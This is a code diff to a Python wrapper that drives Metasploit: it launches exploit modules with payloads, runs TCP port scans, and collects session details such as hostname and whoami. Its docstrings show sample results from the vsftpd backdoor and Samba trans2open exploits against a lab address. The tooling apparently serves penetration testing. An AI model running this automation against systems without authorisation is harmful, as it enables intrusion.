@@ -59,55 +59,12 @@ class ExploitExecution(ModuleExecution):
 
         Args:
             exploit_name (str): the exploit name, e.g.: 'unix/ftp/vsftpd_234_backdoor'
-            options (list(str)): all the options to fill up for the exploit.
+            options (dict): all the options to fill up for the exploit.
             payloads (list(str)): all the payloads to run with the exploit.
             module_type (str): the module type, defaults to 'exploit'
 
         Returns:
             list(dict): exploit details with all chosen payloads in case they were successful in any kind of way.
-
-        Examples for what the function returns:
-
-            [
-            {
-                "session": {
-                    'type': 'shell', 'tunnel_local': '0.0.0.0:0', 'tunnel_peer': '172.18.0.3:6200',
-                    'via_exploit': 'exploit/unix/ftp/vsftpd_234_backdoor', 'via_payload': 'payload/cmd/unix/interact',
-                    'desc': 'Command shell', 'info': '', 'workspace': 'default', 'session_host': '172.18.0.3',
-                    'session_port': 21, 'target_host': '172.18.0.3', 'username': 'unknown', 'uuid': 'kwuol3sx',
-                    'exploit_uuid': 'twu5wlxg', 'routes': '', 'arch': 'cmd'
-                },
-                "hostname": "the host name of the target host (executed using remote shell)",
-                "whoami": "the user of the target host (usually root user), (executed using remote shell)",
-                "job": "a dictionary of job details that runs in background in case there isn't any error"
-            },
-            {
-                "job": { # only job was created and not a session!!!!
-                    'jid': 32, 'name': 'Exploit: freebsd/samba/trans2open', 'start_time': 1607718442, 'datastore': {
-                        'WORKSPACE': None, 'VERBOSE': False, 'WfsDelay': 0, 'EnableContextEncoding': False,
-                        'ContextInformationFile': None, 'DisablePayloadHandler': False, 'RHOSTS': '172.18.0.3',
-                        'RPORT': 139, 'SSL': False, 'SSLVersion': 'Auto', 'SSLVerifyMode': 'PEER', 'SSLCipher': None,
-                        'Proxies': None, 'CPORT': None, 'CHOST': None, 'ConnectTimeout': 10, 'TCP::max_send_size': 0,
-                        'TCP::send_delay': 0, 'NTLM::UseNTLMv2': True, 'NTLM::UseNTLM2_session': True,
-                        'NTLM::SendLM': True, 'NTLM::UseLMKey': False, 'NTLM::SendNTLM': True, 'NTLM::SendSPN': True,
-                        'SMB::pipe_evasion': False, 'SMB::pipe_write_min_size': 1, 'SMB::pipe_write_max_size': 1024,
-                        'SMB::pipe_read_min_size': 1, 'SMB::pipe_read_max_size': 1024, 'SMB::pad_data_level': 0,
-                        'SMB::pad_file_level': 0, 'SMB::obscure_trans_pipe_level': 0, 'SMBDirect': True, 'SMBUser': '',
-                        'SMBPass': '', 'SMBDomain': '.', 'SMBName': '*SMBSERVER', 'SMB::VerifySignature': False,
-                        'SMB::ChunkSize': 500, 'SMB::Native_OS': 'Windows 2000 2195',
-                        'SMB::Native_LM': 'Windows 2000 5.0', 'SMB::AlwaysEncrypt': True, 'BruteWait': None,
-                        'BruteStep': None, 'TARGET': 0, 'PAYLOAD': 'bsd/x86/metsvc_bind_tcp', 'LPORT': 4444,
-                        'PrependSetresuid': False, 'PrependSetreuid': False, 'PrependSetuid': False,
-                        'PrependSetresgid': False, 'PrependSetregid': False, 'PrependSetgid': False,
-                        'AppendExit': False, 'AutoLoadStdapi': True, 'AutoVerifySession': True,
-                        'AutoVerifySessionTimeout': 30, 'InitialAutoRunScript': '', 'AutoRunScript': '',
-                        'AutoSystemInfo': True, 'EnableUnicodeEncoding': False, 'HandlerSSLCert': None,
-                        'SessionRetryTotal': 3600, 'SessionRetryWait': 10, 'SessionExpirationTimeout': 604800,
-                        'SessionCommunicationTimeout': 300, 'PayloadProcessCommandLine': '', 'AutoUnhookProcess': False
-                    }
-                }
-            },
-        ]
         """
         exploit = super().execute_module(module_name=exploit_name, module_type=module_type)
         required_options = exploit.missing_required
@@ -134,9 +91,10 @@ class ExploitExecution(ModuleExecution):
 
         Examples for what the function returns:
 
-            [
+        [
             {
-                "session": {
+                "session":
+                {
                     'type': 'shell', 'tunnel_local': '0.0.0.0:0', 'tunnel_peer': '172.18.0.3:6200',
                     'via_exploit': 'exploit/unix/ftp/vsftpd_234_backdoor', 'via_payload': 'payload/cmd/unix/interact',
                     'desc': 'Command shell', 'info': '', 'workspace': 'default', 'session_host': '172.18.0.3',
@@ -145,11 +103,12 @@ class ExploitExecution(ModuleExecution):
                 },
                 "hostname": "the host name of the target host (executed using remote shell)",
                 "whoami": "the user of the target host (usually root user), (executed using remote shell)",
-                "job": "a dictionary of job details that runs in background in case there isn't any error"
             },
             {
-                "job": { # only job was created and not a session!!!!
-                    'jid': 32, 'name': 'Exploit: freebsd/samba/trans2open', 'start_time': 1607718442, 'datastore': {
+                "job": # only job was created and not a session!!!!
+                {
+                    'jid': 32, 'name': 'Exploit: freebsd/samba/trans2open', 'start_time': 1607718442, 'datastore':
+                    {
                         'WORKSPACE': None, 'VERBOSE': False, 'WfsDelay': 0, 'EnableContextEncoding': False,
                         'ContextInformationFile': None, 'DisablePayloadHandler': False, 'RHOSTS': '172.18.0.3',
                         'RPORT': 139, 'SSL': False, 'SSLVersion': 'Auto', 'SSLVerifyMode': 'PEER', 'SSLCipher': None,
@@ -204,6 +163,7 @@ class ExploitExecution(ModuleExecution):
                     exploit_payload_json[_job] = job_details
 
             if exploit_payload_json:
+                exploit_payload_json["target"] = self.target_host
                 json_exploit_list_with_each_payload.append(exploit_payload_json)
         return json_exploit_list_with_each_payload
 
@@ -225,9 +185,13 @@ class AuxiliaryExecution(ModuleExecution):
         console = self.metasploit_connection.host_console
 
         for cmd in ['use auxiliary/scanner/portscan/tcp', f'set RHOSTS {self.target_host}', 'run']:
+            console_busy = True
             console.write(command=cmd)
-            output = console.read()
-            while not output['busy']:
-                pass
+
+            while console_busy:
+                output = console.read()
+                if not output['busy']:
+                    console_busy = False
+
             if cmd == 'run':
-                return re.findall(pattern=f"{self.target_host}:[0-9]+", string=output)
+                return re.findall(pattern=f"{self.target_host}:[0-9]+", string=output['data'])
